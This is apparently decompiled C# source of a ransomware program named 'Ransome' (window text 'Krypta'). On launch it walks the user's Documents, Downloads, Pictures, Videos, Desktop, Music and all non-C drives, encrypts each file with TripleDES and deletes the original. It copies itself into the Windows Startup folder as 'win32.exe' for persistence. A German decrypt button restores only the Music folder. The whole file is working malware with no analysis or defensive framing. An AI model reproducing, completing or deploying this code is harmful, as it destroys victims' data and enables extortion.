using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Ransome.Properties;

namespace Ransome;

public class Form1 : Form
{
	private string userPath = "C:\\Users\\" + Environment.UserName + "\\";

	private string appPath = Application.get_StartupPath();

	private string key = "";

	public int encFiles = 0;

	private IContainer components = null;

	private Button button1;

	private Label label1;

	private Timer totalEncFilesTmr;

	private ListBox listBox1;

	public Form1()
	{
		InitializeComponent();
		key = GenerateKey();
		totalEncFilesTmr.Start();
	}

	private string GenerateKey()
	{
		DESCryptoServiceProvider dESCryptoServiceProvider = (DESCryptoServiceProvider)DES.Create();
		return Encoding.ASCII.GetString(dESCryptoServiceProvider.Key);
	}

	private void DirSearch(string path)
	{
		try
		{
			string[] files = Directory.GetFiles(path);
			string[] directories = Directory.GetDirectories(path);
			string[] array = files;
			foreach (string text in array)
			{
				listBox1.get_Items().Add((object)(Path.GetFileName(text) + Environment.NewLine));
				encFiles++;
				encrypt(text, text + ".enc", key);
			}
			string[] array2 = directories;
			foreach (string path2 in array2)
			{
				DirSearch(path2);
			}
		}
		catch (Exception)
		{
		}
	}

	private void DeDirSearch(string path)
	{
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string[] files = Directory.GetFiles(path);
			string[] directories = Directory.GetDirectories(path);
			string[] array = files;
			foreach (string text in array)
			{
				encFiles--;
				if (encFiles == 0)
				{
					((Control)this).set_Text("Krypta Decrypted");
					MessageBox.Show("All files have been decrypted");
				}
				else
				{
					decrypt(text, Path.GetDirectoryName(text) + "\\" + Path.GetFileNameWithoutExtension(text), key);
				}
			}
			string[] array2 = directories;
			foreach (string path2 in array2)
			{
				DeDirSearch(path2);
			}
		}
		catch (Exception)
		{
		}
	}

	internal void encrypt(string input, string output, string strHash)
	{
		try
		{
			MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
			byte[] array = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(strHash));
			TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
			tripleDESCryptoServiceProvider.Key = array;
			tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
			using FileStream fileStream = new FileStream(input, FileMode.Open, FileAccess.Read);
			using (FileStream stream = new FileStream(output, FileMode.OpenOrCreate, FileAccess.Write))
			{
				byte[] array2 = new byte[99];
				using CryptoStream cryptoStream = new CryptoStream(stream, tripleDESCryptoServiceProvider.CreateEncryptor(), CryptoStreamMode.Write);
				long length = fileStream.Length;
				int num2;
				for (long num = 0L; num < length; num += num2)
				{
					num2 = fileStream.Read(array2, 0, array2.GetUpperBound(0));
					cryptoStream.Write(array2, 0, num2);
				}
			}
			fileStream.Close();
			File.Delete(input);
		}
		catch (Exception)
		{
		}
	}

	internal void decrypt(string input, string output, string strHash)
	{
		try
		{
			MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
			byte[] array = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(strHash));
			TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
			tripleDESCryptoServiceProvider.Key = array;
			tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
			using (FileStream fileStream = new FileStream(input, FileMode.Open, FileAccess.Read))
			{
				using FileStream stream = new FileStream(output, FileMode.OpenOrCreate, FileAccess.Write);
				byte[] array2 = new byte[99];
				using CryptoStream cryptoStream = new CryptoStream(stream, tripleDESCryptoServiceProvider.CreateDecryptor(), CryptoStreamMode.Write);
				long length = fileStream.Length;
				int num2;
				for (long num = 0L; num < length; num += num2)
				{
					num2 = fileStream.Read(array2, 0, array2.GetUpperBound(0));
					cryptoStream.Write(array2, 0, num2);
				}
			}
			File.Delete(input);
		}
		catch (Exception)
		{
			File.Delete(output);
		}
	}

	private void button1_Click(object sender, EventArgs e)
	{
		DeDirSearch(userPath + "Music");
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.Name.Contains("C"))
			{
			}
		}
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		if (Settings.Default.isRestarted)
		{
			Ware ware = new Ware();
			((Control)ware).Show();
			((Control)this).Hide();
			return;
		}
		DirSearch(userPath + "Documents");
		DirSearch(userPath + "Downloads");
		DirSearch(userPath + "Pictures");
		DirSearch(userPath + "Videos");
		DirSearch(userPath + "Desktop");
		DirSearch(userPath + "Music");
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (!driveInfo.Name.Contains("C"))
			{
				DirSearch(driveInfo.Name);
			}
		}
		try
		{
			File.Copy(Application.get_ExecutablePath(), userPath + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\win32.exe");
		}
		catch (IOException)
		{
			try
			{
				File.Copy(Application.get_ExecutablePath(), userPath + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\win32.exe2432");
			}
			catch (IOException)
			{
			}
		}
	}

	private void totalEncFilesTmr_Tick(object sender, EventArgs e)
	{
		((Control)label1).set_Text("Total: " + encFiles);
	}

	private void Form1_FormClosed(object sender, FormClosedEventArgs e)
	{
		Settings.Default.isRestarted = true;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_0215: Unknown result type (might be due to invalid IL or missing references)
		//IL_021f: Expected O, but got Unknown
		components = new Container();
		button1 = new Button();
		label1 = new Label();
		totalEncFilesTmr = new Timer(components);
		listBox1 = new ListBox();
		((Control)this).SuspendLayout();
		((Control)button1).set_Location(new Point(425, 184));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(150, 33));
		((Control)button1).set_TabIndex(1);
		((Control)button1).set_Text("Entschlüsseln");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Location(new Point(32, 373));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(37, 13));
		((Control)label1).set_TabIndex(2);
		((Control)label1).set_Text("Total: ");
		totalEncFilesTmr.add_Tick((EventHandler)totalEncFilesTmr_Tick);
		((ListControl)listBox1).set_FormattingEnabled(true);
		((Control)listBox1).set_Location(new Point(13, 13));
		((Control)listBox1).set_Name("listBox1");
		((Control)listBox1).set_Size(new Size(261, 342));
		((Control)listBox1).set_TabIndex(3);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(699, 395));
		((Control)this).get_Controls().Add((Control)(object)listBox1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_FormClosed(new FormClosedEventHandler(Form1_FormClosed));
		((Form)this).add_Shown((EventHandler)Form1_Shown);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
